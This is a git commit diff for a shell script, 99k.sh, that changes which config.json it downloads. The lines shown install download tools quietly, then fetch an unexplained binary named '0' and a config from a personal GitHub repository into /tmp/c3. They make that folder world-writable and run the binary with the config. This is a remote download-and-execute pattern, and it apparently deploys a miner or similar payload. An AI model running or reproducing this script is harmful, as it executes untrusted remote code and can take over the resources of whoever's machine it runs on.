5b997a239299c2b496a26802abed2217b61f90cf
Blenkinship <151480121+Blenkinship@users.noreply.github.com>
2023-12-08 21:23:54 +0800

    Update 99k.sh

--- 99k.sh
+++ 99k.sh
@@ -7,7 +7,7 @@ apt-get -qq install -y wget curl unzip
 mkdir -p /tmp/c3
 cd /tmp/c3
 ##wget https://raw.githubusercontent.com/Blenkinship/any/main/4v/config.json
-wget https://raw.githubusercontent.com/Blenkinship/any/main/16v/config.json
+wget https://raw.githubusercontent.com/Blenkinship/any/main/32/config.json
 wget https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R  777 /tmp/c3
 /tmp/c3/0 --config=/tmp/c3/config.json
